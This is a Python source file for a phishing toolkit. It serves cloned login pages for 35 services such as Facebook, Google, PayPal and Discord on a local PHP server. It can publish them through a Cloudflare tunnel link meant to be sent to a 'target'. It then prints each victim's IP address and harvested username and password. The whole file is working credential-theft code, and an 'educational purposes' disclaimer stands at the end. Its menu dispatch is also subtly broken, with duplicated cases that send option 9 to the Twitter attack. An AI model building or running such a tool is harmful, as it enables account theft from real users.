import colorama
import sys
import os
import shutil
import subprocess
import multiprocessing as mp
import socket

#Global Variables
CS_PORT =  8000
CLOUDFLARED = False

def cleanCache():
    for item in os.listdir(".server"):
        os.remove(os.path.join(".server",item))

def subprocessRun():
    subprocess.call(f".tools/php/php.exe -S {socket.gethostbyname_ex(socket.gethostname())[-1][-1]}:{CS_PORT}",cwd=os.path.abspath(".server"),stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)

def waitFetchTunnelLink():
    link =  None
    print(colorama.Fore.YELLOW)
    print(f"[{colorama.Fore.WHITE}:-:{colorama.Fore.YELLOW}] Waiting For Tunnel Link [{colorama.Fore.WHITE}:-:{colorama.Fore.YELLOW}]")
    
    with subprocess.Popen(f".tools/cloudflared/cloudflared.exe tunnel --url {socket.gethostbyname_ex(socket.gethostname())[-1][-1]}:{CS_PORT}",stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True) as p:
        while p.poll() is None:
            stdout = p.stdout.readline()
            sidx = stdout.find("https://")
            lidx = stdout.find("trycloudflare.com")
            if sidx != -1 and lidx != -1:
                link = stdout[sidx:lidx+17]
                break    
        print(f"[{colorama.Fore.WHITE}-{colorama.Fore.YELLOW}] Link Is Generated :  {link}")
        print(f"[{colorama.Fore.WHITE}:-:{colorama.Fore.YELLOW}] Send This Link To Target [{colorama.Fore.WHITE}:-:{colorama.Fore.YELLOW}]")

def waitFetchInformation(m_process:mp.Process):
    ipFileIo = None
    userFileIo =  None
    IPS = []
    USERCREDS = []

    print(colorama.Fore.YELLOW)
    print(f"[{colorama.Fore.WHITE}:-:{colorama.Fore.YELLOW}] Waiting For Victim's IP [{colorama.Fore.WHITE}:-:{colorama.Fore.YELLOW}]\n")
    while m_process.is_alive():
        if os.path.exists(".server/ip.txt") and not ipFileIo:
            ipFileIo = open(".server/ip.txt","r")
        if os.path.exists(".server/usernames.txt") and not userFileIo:
            userFileIo = open(".server/usernames.txt","r+")
        if ipFileIo:
            data = ipFileIo.readline()
            if data[:2] == "IP" and data[4:] not in IPS:
                print(colorama.Fore.CYAN)
                print(f"[{colorama.Fore.WHITE}:-:{colorama.Fore.CYAN}] Found Victim's IP : {colorama.Fore.WHITE}{data[4:]}{colorama.Fore.CYAN}\n")
                IPS.append(data[4:])
        if userFileIo:
            data = userFileIo.readline()
            sidx = data.lower().find("username: ")
            lidx = data.lower().find("pass: ")
            if sidx != -1 and lidx != -1:
                if [data[sidx+10:lidx-1],data[lidx+6:]] not in USERCREDS:
                    print(colorama.Fore.RED)
                    print(f"[{colorama.Fore.WHITE}:-:{colorama.Fore.RED}] Username : {colorama.Fore.WHITE}{data[sidx+10:lidx-1]}{colorama.Fore.RED}\n[{colorama.Fore.WHITE}:-:{colorama.Fore.RED}] Password : {colorama.Fore.WHITE}{data[lidx+6:]}{colorama.Fore.RED}\n")
                    USERCREDS.append([data[sidx+10:lidx-1],data[lidx+6:]])

def setupStartServer():
    print(colorama.Fore.CYAN)
    print(f"[{colorama.Fore.WHITE}-{colorama.Fore.CYAN}] Starting php server on ('{socket.gethostbyname_ex(socket.gethostname())[-1][-1]}',{CS_PORT}){colorama.Fore.RESET}")
    m_process = mp.Process(target=subprocessRun)
    m_process.start()
    if CLOUDFLARED:
        c_process = mp.Process(target=waitFetchTunnelLink)
        c_process.start()
    waitFetchInformation(m_process)

def printWelcome():
    print(colorama.Fore.BLUE+"\t        Welcome To")
    print(colorama.Fore.LIGHTRED_EX+"""
             _    _____   _____          
            | |  / _ \ \ / / __|         
            | |_| (_) \ V /| _|          
    ___ _  |____\___/_\_/ |___|  _  ___ 
    | _ \ |_ |_ _/ __| || |_ _| \| |/ __|
    |  _/ ' \ | |\__ \ __ || || .` | (_ |
    |_| |_||_|___|___/_||_|___|_|\_|\___|
                                                                        
    """)
    print(colorama.Fore.YELLOW+"\t\tVERSION : 1.0.0\n")
    print(colorama.Fore.LIGHTBLUE_EX+"[-] Created By Prem Shelby\n")
    print(f"[{colorama.Fore.WHITE}:-:{colorama.Fore.CYAN}] Select An Attack For Your Victim [{colorama.Fore.WHITE}:-:{colorama.Fore.CYAN}]\n\n")

def printAttacks():
    print(f"[{colorama.Fore.WHITE}01{colorama.Fore.CYAN}] Facebook",end="\t")
    print(f"[{colorama.Fore.WHITE}11{colorama.Fore.CYAN}] Twitch",end="\t")
    print(f"[{colorama.Fore.WHITE}21{colorama.Fore.CYAN}] DevianArt")

    print(f"[{colorama.Fore.WHITE}02{colorama.Fore.CYAN}] Instagram",end="\t")
    print(f"[{colorama.Fore.WHITE}12{colorama.Fore.CYAN}] Pinterest",end="\t")
    print(f"[{colorama.Fore.WHITE}22{colorama.Fore.CYAN}] Badoo")

    print(f"[{colorama.Fore.WHITE}03{colorama.Fore.CYAN}] Google",end="\t")
    print(f"[{colorama.Fore.WHITE}13{colorama.Fore.CYAN}] Snapchat",end="\t")
    print(f"[{colorama.Fore.WHITE}23{colorama.Fore.CYAN}] Origin")

    print(f"[{colorama.Fore.WHITE}04{colorama.Fore.CYAN}] Microsoft",end="\t")
    print(f"[{colorama.Fore.WHITE}14{colorama.Fore.CYAN}] Linkedin",end="\t")
    print(f"[{colorama.Fore.WHITE}24{colorama.Fore.CYAN}] DropBox")

    print(f"[{colorama.Fore.WHITE}05{colorama.Fore.CYAN}] Netflix",end="\t")
    print(f"[{colorama.Fore.WHITE}15{colorama.Fore.CYAN}] Ebay",end="\t")
    print(f"[{colorama.Fore.WHITE}25{colorama.Fore.CYAN}] Yahoo")

    print(f"[{colorama.Fore.WHITE}06{colorama.Fore.CYAN}] Paypal",end="\t")
    print(f"[{colorama.Fore.WHITE}16{colorama.Fore.CYAN}] Quora",end="\t")
    print(f"[{colorama.Fore.WHITE}26{colorama.Fore.CYAN}] Wordpress")

    print(f"[{colorama.Fore.WHITE}07{colorama.Fore.CYAN}] Steam",end="\t")
    print(f"[{colorama.Fore.WHITE}17{colorama.Fore.CYAN}] Protonmail",end="\t")
    print(f"[{colorama.Fore.WHITE}27{colorama.Fore.CYAN}] Yandex")

    print(f"[{colorama.Fore.WHITE}08{colorama.Fore.CYAN}] Twitter",end="\t")
    print(f"[{colorama.Fore.WHITE}18{colorama.Fore.CYAN}] Spotify",end="\t")
    print(f"[{colorama.Fore.WHITE}28{colorama.Fore.CYAN}] StackoverFlow")

    print(f"[{colorama.Fore.WHITE}09{colorama.Fore.CYAN}] PlayStation",end="")
    print(f"[{colorama.Fore.WHITE}19{colorama.Fore.CYAN}] Reddit",end="\t")
    print(f"[{colorama.Fore.WHITE}29{colorama.Fore.CYAN}] Vk")

    print(f"[{colorama.Fore.WHITE}10{colorama.Fore.CYAN}] Tiktok",end="\t")
    print(f"[{colorama.Fore.WHITE}20{colorama.Fore.CYAN}] Adobe",end="\t")
    print(f"[{colorama.Fore.WHITE}30{colorama.Fore.CYAN}] XBOX")

    print(f"[{colorama.Fore.WHITE}31{colorama.Fore.CYAN}] Mediafire",end="\t")
    print(f"[{colorama.Fore.WHITE}32{colorama.Fore.CYAN}] Gitlab",end="\t")
    print(f"[{colorama.Fore.WHITE}33{colorama.Fore.CYAN}] Github")

    print(f"[{colorama.Fore.WHITE}34{colorama.Fore.CYAN}] Discord",end="\t")
    print(f"[{colorama.Fore.WHITE}35{colorama.Fore.CYAN}] Roblox\n\n")

def printExitAbout():
    print(f"[{colorama.Fore.WHITE}99{colorama.Fore.CYAN}] About",end="\t")
    print(f"[{colorama.Fore.WHITE}00{colorama.Fore.CYAN}] Exit\n\n")

def printAboutTool():
    print(colorama.Fore.WHITE)
    print(f"[{colorama.Fore.CYAN}Developer{colorama.Fore.WHITE}] - Prem Shelby")
    print(colorama.Fore.RED)
    print(f"[{colorama.Fore.WHITE}-{colorama.Fore.RED}] This Tool Is Only Created For Educational Purposes.\nAuthor Will Not Be Responsible For Any Misuse Of This Toolkit.\n")
    sys.exit()

def takeInput():
    choice = input(f"[{colorama.Fore.WHITE}:-:{colorama.Fore.CYAN}]{colorama.Fore.GREEN} Select an option : {colorama.Fore.RESET}")
    print("\n")
    try:
        choice = int(choice)
    except ValueError:
        sys.exit()
    return choice

def printInvalidChoice():
    print(f"{colorama.Fore.RED}[{colorama.Fore.WHITE}-{colorama.Fore.RED}] invalid choice")
    sys.exit()

def inputCustomPort():
    global CS_PORT
    print(colorama.Fore.YELLOW)
    choice = input(f"[{colorama.Fore.WHITE}?{colorama.Fore.YELLOW}] Do you want to use custom port ? (y/n) : {colorama.Fore.RESET}")    
    match choice:
        case 'y':
            print(colorama.Fore.CYAN)
            choice = input(f"[{colorama.Fore.WHITE}:-:{colorama.Fore.CYAN}] Enter Your Custom Port (1000-9999) : {colorama.Fore.RESET}")
            try:
                CS_PORT = int(choice)
            except ValueError:
                sys.exit()
        case 'n':
            CS_PORT = 8000
        case _:
            printInvalidChoice()

def printModesOfHosting():
    global CLOUDFLARED
    print(colorama.Fore.CYAN)
    print(f"[{colorama.Fore.WHITE}01{colorama.Fore.CYAN}] Localhost")
    print(f"[{colorama.Fore.WHITE}02{colorama.Fore.CYAN}] Cloudflared")

    choice = takeInput()
    inputCustomPort()
    match choice:
        case 1:
            CLOUDFLARED = False
        case 2:
            CLOUDFLARED = True
        case _:
            printInvalidChoice()

def inputFacebookAttack():
    print(colorama.Fore.CYAN)
    print(f"[{colorama.Fore.WHITE}01{colorama.Fore.CYAN}] Traditional Login Page")
    print(f"[{colorama.Fore.WHITE}02{colorama.Fore.CYAN}] Advanced Voting Poll Login Page")
    print(f"[{colorama.Fore.WHITE}03{colorama.Fore.CYAN}] Fake Security Login Page")
    print(f"[{colorama.Fore.WHITE}04{colorama.Fore.CYAN}] Facebook Messenger Login Page\n\n")

    choice = takeInput()
    match choice:
        case 1:
            os.system("cls")
            printWelcome()
            printModesOfHosting()
            shutil.copytree(".sites/facebook",".server/",dirs_exist_ok=True)
            shutil.copy2(".sites/ip.php",".server/")
        case 2:
            os.system("cls")
            printWelcome()
            printModesOfHosting()
            shutil.copytree(".sites/fb_advanced",".server/",dirs_exist_ok=True)
            shutil.copy2(".sites/ip.php",".server/")
        case 3:
            os.system("cls")
            printWelcome()
            printModesOfHosting()
            shutil.copytree(".sites/fb_security",".server/",dirs_exist_ok=True)
            shutil.copy2(".sites/ip.php",".server/")
        case 4:
            os.system("cls")
            printWelcome()
            printModesOfHosting()
            shutil.copytree(".sites/fb_messenger",".server/",dirs_exist_ok=True)
            shutil.copy2(".sites/ip.php",".server/")
        case _:
            printInvalidChoice()
    
    setupStartServer()

def inputInstagramAttack():
    print(colorama.Fore.CYAN)
    print(f"[{colorama.Fore.WHITE}01{colorama.Fore.CYAN}] Traditional Login Page")
    print(f"[{colorama.Fore.WHITE}02{colorama.Fore.CYAN}] Auto Followers Login Page")
    print(f"[{colorama.Fore.WHITE}03{colorama.Fore.CYAN}] 1000 Followers Login Page")
    print(f"[{colorama.Fore.WHITE}04{colorama.Fore.CYAN}] Blue Badge Verify Login Page\n\n")

    choice = takeInput()
    match choice:
        case 1:
            os.system("cls")
            printWelcome()
            printModesOfHosting()
            shutil.copytree(".sites/instagram",".server/",dirs_exist_ok=True)
            shutil.copy2(".sites/ip.php",".server/")
        case 2:
            os.system("cls")
            printWelcome()
            printModesOfHosting()
            shutil.copytree(".sites/ig_followers",".server/",dirs_exist_ok=True)
            shutil.copy2(".sites/ip.php",".server/")
        case 3:
            os.system("cls")
            printWelcome()
            printModesOfHosting()
            shutil.copytree(".sites/insta_followers",".server/",dirs_exist_ok=True)
            shutil.copy2(".sites/ip.php",".server/")
        case 4:
            os.system("cls")
            printWelcome()
            printModesOfHosting()
            shutil.copytree(".sites/ig_verify",".server/",dirs_exist_ok=True)
            shutil.copy2(".sites/ip.php",".server/")
        case _:
            printInvalidChoice()
    
    setupStartServer()

def inputGoogleAttack():
    print(colorama.Fore.CYAN)
    print(f"[{colorama.Fore.WHITE}01{colorama.Fore.CYAN}] Gmail Old Login Page")
    print(f"[{colorama.Fore.WHITE}02{colorama.Fore.CYAN}] Gmail New Login Page")
    print(f"[{colorama.Fore.WHITE}03{colorama.Fore.CYAN}] Advanced Voting Poll Page\n\n")

    choice = takeInput()
    match choice:
        case 1:
            os.system("cls")
            printWelcome()
            printModesOfHosting()
            shutil.copytree(".sites/google",".server/",dirs_exist_ok=True)
            shutil.copy2(".sites/ip.php",".server/")
        case 2:
            os.system("cls")
            printWelcome()
            printModesOfHosting()
            shutil.copytree(".sites/google_new",".server/",dirs_exist_ok=True)
            shutil.copy2(".sites/ip.php",".server/")
        case 3:
            os.system("cls")
            printWelcome()
            printModesOfHosting()
            shutil.copytree(".sites/google_poll",".server/",dirs_exist_ok=True)
            shutil.copy2(".sites/ip.php",".server/")
        case _:
            printInvalidChoice()
    
    setupStartServer()

def inputMicrosoftAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/microsoft",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputNetflixAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/netflix",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputPaypalAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/paypal",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputSteamAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/steam",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputTwitterAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/twitter",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputPlaystationAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/playstation",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputTiktokAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/tiktok",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputTwitchAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/twitch",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputPinterestAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/pinterest",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputSnapchatAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/snapchat",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputLinkedinAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/linkedin",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputEbayAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/ebay",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputQuoraAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/quora",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputProtonmailAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/protonmail",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputSpotifyAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/spotify",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputRedditAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/reddit",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputAdobeAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/adobe",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputDevianArtAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/devianart",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputBadooAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/badoo",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputOriginAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/origin",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputDropBoxAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/dropbox",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputYahooAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/yahoo",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputWordpressAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/wordpress",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputYandexAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/yandex",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputStackoverFlowAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/stackoverflow",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputVkAttack():
    print(colorama.Fore.CYAN)
    print(f"[{colorama.Fore.WHITE}01{colorama.Fore.CYAN}] Vk Login Page")
    print(f"[{colorama.Fore.WHITE}02{colorama.Fore.CYAN}] Vk Poll Login Page\n\n")

    choice = takeInput()
    match choice:
        case 1:
            os.system("cls")
            printWelcome()
            printModesOfHosting()
            shutil.copytree(".sites/vk",".server/",dirs_exist_ok=True)
            shutil.copy2(".sites/ip.php",".server/")
        case 2:
            os.system("cls")
            printWelcome()
            printModesOfHosting()
            shutil.copytree(".sites/vk_poll",".server/",dirs_exist_ok=True)
            shutil.copy2(".sites/ip.php",".server/")
        case _:
            printInvalidChoice()
    
    setupStartServer()

def inputXBoxAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/xbox",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputMediafireAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/mediafire",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputGitlabAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/gitlab",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputGithubAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/github",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputDiscordAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/discord",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()

def inputRobloxAttack():
    os.system("cls")
    printWelcome()
    printModesOfHosting()
    shutil.copytree(".sites/roblox",".server/",dirs_exist_ok=True)
    shutil.copy2(".sites/ip.php",".server/")
    setupStartServer()
    
def inputAttackMethod():
    choice = takeInput()

    match choice:
        case 0:
            sys.exit()
        case 1:
            cleanCache()
            inputFacebookAttack()
        case 2:
            cleanCache()
            inputInstagramAttack()
        case 3:
            cleanCache()
            inputGoogleAttack()
        case 4:
            cleanCache()
            inputMicrosoftAttack()
        case 5:
            cleanCache()
            inputNetflixAttack()
        case 6:
            cleanCache()
            inputPaypalAttack()
        case 7:
            cleanCache()
            inputSteamAttack()
        case 9:
            cleanCache()
            inputTwitterAttack()
        case 7:
            cleanCache()
            inputPlaystationAttack()
        case 7:
            cleanCache()
            inputSteamAttack()
        case 8:
            cleanCache()
            inputTwitterAttack()
        case 9:
            cleanCache()
            inputPlaystationAttack()
        case 10:
            cleanCache()
            inputTiktokAttack()
        case 11:
            cleanCache()
            inputTwitchAttack()
        case 12:
            cleanCache()
            inputPinterestAttack()
        case 13:
            cleanCache()
            inputSnapchatAttack()
        case 14:
            cleanCache()
            inputLinkedinAttack()
        case 15:
            cleanCache()
            inputEbayAttack()
        case 16:
            cleanCache()
            inputQuoraAttack()
        case 17:
            cleanCache()
            inputProtonmailAttack()
        case 18:
            cleanCache()
            inputSpotifyAttack()
        case 19:
            cleanCache()
            inputRedditAttack()
        case 20:
            cleanCache()
            inputAdobeAttack()
        case 21:
            cleanCache()
            inputDevianArtAttack()
        case 22:
            cleanCache()
            inputBadooAttack()
        case 23:
            cleanCache()
            inputOriginAttack()
        case 24:
            cleanCache()
            inputDropBoxAttack()
        case 25:
            cleanCache()
            inputYahooAttack()
        case 26:
            cleanCache()
            inputWordpressAttack()
        case 27:
            cleanCache()
            inputYandexAttack()
        case 28:
            cleanCache()
            inputStackoverFlowAttack()
        case 29:
            cleanCache()
            inputVkAttack()
        case 30:
            cleanCache()
            inputXBoxAttack()
        case 31:
            cleanCache()
            inputMediafireAttack()
        case 32:
            cleanCache()
            inputGitlabAttack()
        case 33:
            cleanCache()
            inputGithubAttack()
        case 34:
            cleanCache()
            inputDiscordAttack()
        case 35:
            cleanCache()
            inputRobloxAttack()
        case 99:
            printAboutTool()
        case _:
            printInvalidChoice()

if __name__ == "__main__":
    colorama.init()
    printWelcome()
    printAttacks()
    printExitAbout()
    inputAttackMethod()